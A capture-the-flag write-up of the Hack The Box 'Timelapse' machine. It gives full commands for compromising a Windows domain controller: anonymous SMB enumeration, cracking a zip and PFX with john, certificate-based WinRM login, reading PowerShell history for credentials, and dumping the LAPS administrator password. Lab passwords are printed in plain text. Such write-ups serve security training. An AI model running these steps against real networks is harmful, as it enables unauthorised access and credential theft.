---
title: "Timelapse"
date: 2024-11-29
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "timelapse", "htb writeup", "htb walkthrough", "hackthebox", "writeup"]
---

## Enumeration

>- SMB contains password-protected `winrm_backup.zip` file.
	-  Crack the file using zip2john
- The output is a pfx file which contains an SSL certificate in `PKCS#12` format and a private key.
- PFX file can be used by WinRM in order to login without a password. 
	- Use *pfx3john* to convert the `.pfx` into hash format and use *john* to crack the password. 
	- Extract the SSL certificate and private key from the `.pfx` file.

### Nmap

```sh
Nmap scan report for 10.10.11.152
Host is up, received user-set (0.018s latency).
Scanned at 2024-08-11 11:50:01 AEST for 634s
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain?       syn-ack
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-08-11 09:51:03Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5986/tcp  open  ssl/http      syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2024-08-11T10:00:32+00:00; +7h59m57s from scanner time.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
...
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### SMB

![screenshot](/assets/images/timelapse1.png)

```sh
nxc smb 10.10.11.152 -u 'guest' -p '' -M spider_plus
```

```json
{
    "Shares": {
        "Dev/winrm_backup.zip": {
            "atime_epoch": "2022-03-04 19:00:38",
            "ctime_epoch": "2021-10-26 02:48:14",
            "mtime_epoch": "2021-10-26 08:05:30",
            "size": "2.55 KB"
        },
        "HelpDesk/LAPS.x64.msi": {
            "atime_epoch": "2021-10-26 02:48:42",
            "ctime_epoch": "2021-10-26 02:48:42",
            "mtime_epoch": "2021-10-26 02:55:14",
            "size": "1.07 MB"
        },
        "HelpDesk/LAPS_Datasheet.docx": {
            "atime_epoch": "2021-10-26 02:48:42",
            "ctime_epoch": "2021-10-26 02:48:42",
            "mtime_epoch": "2021-10-26 02:55:14",
            "size": "101.97 KB"
        },
        "HelpDesk/LAPS_OperationsGuide.docx": {
            "atime_epoch": "2021-10-26 02:48:42",
            "ctime_epoch": "2021-10-26 02:48:42",
            "mtime_epoch": "2021-10-26 02:55:14",
            "size": "626.35 KB"
        },
        "HelpDesk/LAPS_TechnicalSpecification.docx": {
            "atime_epoch": "2021-10-26 02:48:42",
            "ctime_epoch": "2021-10-26 02:48:42",
            "mtime_epoch": "2021-10-26 02:55:14",
            "size": "70.98 KB"
        }
    }
}
```

#### winrm_backup.zip

![screenshot](/assets/images/timelapse2.png)

```sh
zip2john winrm_backup.zip > hash
john -w=/usr/share/wordlists/rockyou.txt hash
```

![screenshot](/assets/images/timelapse3.png)

#### legacyy_dev_auth.pfx

![screenshot](/assets/images/timelapse4.png)

The output is a PFX file that includes an SSL certificate and a private key in PKCS#12 format.

PFX files allow WinRM to authenticate without requiring a password.

```sh
# extracting SSL certificate and a private key
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```

![screenshot](/assets/images/timelapse11.png)

`supremelegacy` is not the correct password. 

Using the *pfx2john*, I can convert the pfx file into a hash format.

Then, use *John* to crack the password. 

```sh
python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john

john pfx.john -w=/usr/share/wordlists/rockyou.txt
```

![screenshot](/assets/images/timelapse12.png)

```text
thuglegacy
```

I can now extract the SSL certificate and private key from the pfx file as below.

```sh
# extract the private key from the pfx file
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes

# extract the SSL certificate from the pfx file
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

![screenshot](/assets/images/timelapse13.png)

![screenshot](/assets/images/timelapse14.png)

#### LAPS_Datasheet.docx

![screenshot](/assets/images/timelapse5.png)

#### LAPS_OperationsGuide.docx

### LAPS_TechnicalSpecifications.docx

![screenshot](/assets/images/timelapse6.png)

### LDAP

```sh
ldapsearch -x -H ldap://10.10.11.152 -D '' -w '' -b "DC=timelapse,DC=htb" > tmp
```

```sh
# copy paste the output into tmp and show unique items (anomaly) 
cat tmp | awk '{print $1}' | sort | uniq -c | sort -nr
```

![screenshot](/assets/images/timelapse9.png)


## Foothold
> - Evil-winrm using the certificate and private key. 

### Extracting Keys

```sh
# dump the key
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc

# decrypt the key
openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key

# dump the certificate
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
```

![screenshot](/assets/images/timelapse15.png)

### Evil-winrm

```sh
#  initial try - did not work
evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem 

# this worked
evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```

![screenshot](/assets/images/timelapse16.png)


## Lateral Movement

>- The command line history shows new login credentials. 
- Evil-winrm using the obtained credentials `svc_deploy`.

### Reading PowerShell history

```powershell
# Read history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

![screenshot](/assets/images/timelapse19.png)

```text
svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV
```

### Evil-winrm as `svc_deploy`

```sh
evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

![screenshot](/assets/images/timelapse20.png)

## Privilege Escalation
>- `svc_deploy` is a member of `LAPS_Readers` group.
- Running `Get-ADComputer DC01 -property 'ms-mcs-admpwd'` shows the password for the administrator.
- Evil-winrm as admin. 
 
### WinPEAS

Program 'peas.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted software.

AV is enabled on the target machine. 

![screenshot](/assets/images/timelapse17.png)

### Manual Enumeration

![screenshot](/assets/images/timelapse21.png)

-> *LAPS_Readers* group. 

The "Local Administrator Password Solution" (LAPS) is used to manage local account passwords of Active Directory computers. 

#### Read Password

```powershell
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```

![screenshot](/assets/images/timelapse22.png)

### Evil-winrm as admin

```sh
evil-winrm -i timelapse.htb -S -u administrator -p '55T{8XL047sxk(5Iv}fK3o02'
```

![screenshot](/assets/images/timelapse23.png)

